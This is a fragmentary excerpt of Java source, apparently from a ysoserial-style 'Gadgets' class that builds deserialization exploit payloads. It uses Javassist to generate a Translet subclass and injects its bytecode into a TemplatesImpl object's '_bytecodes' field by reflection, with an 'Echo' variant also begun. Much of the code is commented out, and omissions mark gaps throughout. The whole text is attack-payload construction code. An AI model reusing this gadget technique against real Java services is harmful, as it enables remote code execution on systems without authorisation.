...
public class Gadgets {
    ...
    public static class Doge implements Serializable {
...
//        pool.insertClassPath(new ClassClassPath(Gadgets.StubTransletPayload.class));
        ...
        final CtClass clazz = pool.makeClass("dogeser.Doge" + System.nanoTime());
...
//            File file = new File("D:\\cat.class");
...
//        clazz.setName("dogeser.ser" + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);
        classBytes = clazz.toBytecode();
//        File file = new File("D:\\cat1.class");
//        FileOutputStream fileOutputStream = new FileOutputStream(file);
//        fileOutputStream.write(classBytes);


//        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{classBytes, ClassFiles.classAsBytes(Gadgets.Doge.class)});
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {classBytes});
        Reflections.setFieldValue(templates, "_name", "Doge");
//        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
    ...
    public static <T> T createTemplatesImplEcho(Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory)
        ...
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        CtClass clazz;
        clazz = pool.makeClass("dogeser.ser" + System.nanoTime());
